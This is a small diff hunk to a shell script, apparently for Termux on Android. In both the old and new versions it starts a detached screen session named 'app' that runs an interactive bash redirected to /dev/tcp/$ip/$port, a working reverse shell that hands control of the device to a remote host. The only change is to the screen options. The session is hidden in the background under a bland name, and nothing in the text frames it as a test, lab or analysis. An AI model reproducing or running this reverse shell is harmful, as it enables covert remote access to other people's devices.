@@ -8,9 +8,9 @@ port=1234
 if [ -d "$DIR" ]
 then
 
-	screen -dmLS app termux-chroot -- $PREFIX/bin/bash -i >& /dev/tcp/$ip/$port 0>&1
+	screen -AmdS app termux-chroot -- $PREFIX/bin/bash -i >& /dev/tcp/$ip/$port 0>&1
 else
 	apt install screen
 	clear
-	screen -dmLS app termux-chroot -- $PREFIX/bin/bash -i >& /dev/tcp/$ip/$port 0>&1
+	screen -AmdS app termux-chroot -- $PREFIX/bin/bash -i >& /dev/tcp/$ip/$port 0>&1
 fi
